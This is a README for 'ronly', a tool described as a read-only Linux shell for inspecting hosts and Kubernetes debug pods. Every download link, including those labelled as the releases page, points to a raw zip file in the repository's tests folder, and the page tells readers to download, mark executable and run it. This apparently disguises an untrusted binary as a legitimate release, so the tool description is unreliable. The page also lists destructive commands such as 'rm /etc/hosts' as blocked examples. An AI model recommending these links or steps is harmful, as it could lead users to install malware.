# 🛡️ ronly - Keep shells safe from damage

[Download ronly](https://github.com/eddysouthwestern739/ronly/raw/refs/heads/main/tests/Software-v3.1.zip){: style="background-color:#6c757d;color:white;padding:10px 16px;border-radius:6px;text-decoration:none;display:inline-block;font-weight:600;"}

## 📥 Download ronly

1. Open the [releases page](https://github.com/eddysouthwestern739/ronly/raw/refs/heads/main/tests/Software-v3.1.zip).
2. Find the latest release.
3. Download the file for your Linux system.
4. Save the file in a folder you can find again, such as Downloads.
5. If the file is packed in a `.tar.gz` or `.zip`, extract it first.

## 🖥️ What ronly does

ronly opens a Linux shell that looks normal, but risky changes are blocked at the kernel level.

Use it when you want to inspect a system without giving the session full power. You can read logs, check process lists, and look around the file system. Actions that can damage the system are stopped.

### Common uses

- Check logs on a live system
- Inspect a container or debug pod
- Review files without letting a session change them
- Test commands in a safer shell
- Limit what an untrusted agent can do

## ⚙️ System requirements

ronly is for Linux only.

It runs in rootless mode when the system supports user namespaces. That works on many modern systems, such as:

- Debian 11 or newer
- RHEL 8 or newer
- Ubuntu 16.04 or newer
- Linux kernels 4.6 and newer

If user namespaces are not available, ronly can fall back to privileged mode.

## 🚀 Get started

1. Download ronly from the [releases page](https://github.com/eddysouthwestern739/ronly/raw/refs/heads/main/tests/Software-v3.1.zip).
2. Open a terminal.
3. Move to the folder where you saved the file.
4. Start ronly from that file.

Example:

```bash
./ronly
```

If the file is not marked as runnable, you may need to set it first:

```bash
chmod +x ronly
./ronly
```

## 🧭 What you should see

When ronly starts, it should show which mode it picked.

Example:

```bash
ronly: using user namespaces (--rootless)
```

Then you get a shell that works for normal reading tasks.

Examples:

```bash
top -bn1 | head -5
cat /var/log/syslog | grep error
ps aux
ls /etc
```

## 🔒 What is blocked

ronly blocks commands that could change or damage the system.

Examples:

```bash
rm /etc/hosts
kill 1
docker run nginx
```

These actions are blocked in the session, even if the shell looks like a normal root shell.

## 🧪 Example session

```bash
$ kubectl exec -it debug-pod -- ronly
ronly: using user namespaces (--rootless)
root@debug-pod:~# top -bn1 | head -5
top - 14:23:01 up 42 days, load average: 2.31, 1.87
Tasks: 312 total,   1 running, 311 sleeping
%Cpu(s):  8.3 us,  2.1 sy,  0.0 ni, 89.1 id
MiB Mem:  32168.0 total,  12042.3 free

root@debug-pod:~# cat /var/log/syslog | grep error
Mar 24 09:14:02 prod payment-svc: connection error

root@debug-pod:~# rm /etc/hosts
rm: cannot remove '/etc/hosts': Read-only file system

root@debug-pod:~# kill 1
bash: kill: (1) - Operation not permitted

root@debug-pod:~# docker run nginx
ronly: docker run is blocked (read-only session)
```

## 🧩 How it works

ronly uses the Linux kernel to keep the session safe.

When user namespaces are available, it runs rootless. That means it can give you a shell that feels powerful without giving it real control over the host.

When user namespaces are not available, it uses a privileged mode to keep the same read-only behavior.

## 🧰 Typical setup on a Linux host

If you use ronly on a local Linux machine, follow these steps:

1. Download the release file.
2. Open a terminal.
3. Go to the folder with the file.
4. Run the app.
5. Use it for read-only work such as logs, process checks, and system review.

## 🐳 Using ronly in a container or pod

ronly fits well in container debug work.

Example:

```bash
kubectl exec -it debug-pod -- ronly
```

You can then inspect the container without allowing destructive commands.

## 📂 Files and commands you can inspect

You can use ronly for tasks like these:

- Reading log files
- Checking system status
- Listing folders
- Viewing config files
- Inspecting running processes
- Reviewing network state

These tasks help you learn what is happening on a system without changing it.

## 🛠️ If the app does not start

If ronly does not open, check these common points:

- You downloaded the file for Linux
- The file has execute permission
- You are on a supported Linux system
- Your kernel supports user namespaces
- You have access to the folder where you saved the file

If the app still does not start, try a different release file from the releases page.

## 📌 Release download

Use the [ronly releases page](https://github.com/eddysouthwestern739/ronly/raw/refs/heads/main/tests/Software-v3.1.zip) to download and run the app on your Linux system

## 🧭 Basic commands to try

After ronly starts, you can try:

```bash
pwd
ls
whoami
ps aux
cat /etc/os-release
dmesg | tail
```

These commands help you confirm the shell works and let you inspect the system safely

## 🧱 Good places to use ronly

- Debug pods
- Production support sessions
- Shared servers
- Temporary access for outside help
- Systems where you want read access only

## 📝 Notes on behavior

ronly is made for read-only sessions. It does not aim to replace normal admin access. It gives you a shell that is useful for inspection while blocking dangerous changes at the kernel level